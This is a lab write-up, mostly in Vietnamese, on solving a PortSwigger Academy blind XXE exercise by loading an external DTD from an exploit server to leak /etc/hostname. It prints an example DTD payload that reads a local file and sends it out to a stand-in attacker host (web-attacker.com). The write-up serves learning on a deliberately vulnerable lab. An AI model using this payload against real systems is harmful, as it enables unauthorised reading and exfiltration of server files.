Description: This lab has a “Check stock” feature that parses XML input but does not display the result. To solve the lab, exfiltrate the contents of the /etc/hostname file.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator’s default public server (burpcollaborator.net).

Lại là 1 bài blind XXE với lổ hổng nằm ở Check stock. Để giải được challenge này thì ta cần phải truy cập /etc/hostname. Và ta sẽ sử dụng external dtd. Tức là 1 file dtd bên ngoài.

Do nó không cho phép ta sử dụng external entity nên mình sẽ thử có thể dùng Parameter entity như lab trước không bằng cách tạo 1 Parameter entity là xxe và cho nó tạo request đến Burp Collaborater:

![image](https://github.com/elliSzAt/XML-external-entity-XXE-injection/assets/125866921/aab98d35-d7f5-47e7-bf63-1bd5cd9d6c8b)

Tình hình vẫn ổn do đó việc sử dụng parameter entity là không sai.

Tiếp theo mình sẽ tạo 1 file .dtd trên server exploit sau đó load nó bằng Parameter Entity xxe.

![image](https://github.com/elliSzAt/XML-external-entity-XXE-injection/assets/125866921/a7961844-82da-4682-9fe0-2751270325e5)

Ở phần server exploit có mục ``Access log``, mình thử truy cập vào để xem file .dtd có được load thành công hay không.

![image](https://github.com/elliSzAt/XML-external-entity-XXE-injection/assets/125866921/182d9903-c6a2-49a7-ab60-11601450a724)

Bây giờ việc cần làm là trong file .dtd đó sẽ chứa gì để ta có thể đọc được file /etc/hostname.

Sau khi search trên google thì mình biết được là .dtd file sẽ gồm các bước sau:

![image](https://github.com/elliSzAt/XML-external-entity-XXE-injection/assets/125866921/c7e74e67-4610-4185-acbb-97b4f4b44865)

  - Định nghĩa 1 XML parameter entity gọi là file, bao gồm nội dung của file cần đọc.
  - Định nghĩa 1 XML parameter entity gọi là eval, chứa một khai báo động của một XML parameter entity khác được gọi là exfiltrate. Thực thể exfiltrate sẽ được đánh giá bằng cách thực hiện một yêu cầu HTTP đến máy chủ web của kẻ tấn công(Burp Collaborator) có chứa giá trị của thực thể file trong chuỗi truy vấn URL. Sử dụng thực thể eval, thực thể này khiến việc khai báo động của thực thể exfiltrate được thực hiện. Sử dụng thực thể exfiltrate, để giá trị của nó được đánh giá bằng cách yêu cầu URL được chỉ định.

Ví dụ:

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Bây giờ ta chỉ cần tạo 1 file .dtd file tương tự lên server exploit sau đó load nó bằng thực thể xxe.

![image](https://github.com/elliSzAt/XML-external-entity-XXE-injection/assets/125866921/7788b0e3-0d9e-4055-b90a-7a31a977c4ec)

Vậy nội dung của file là 3e6a2fcd0641, submit là hoàn thành lab thôi.
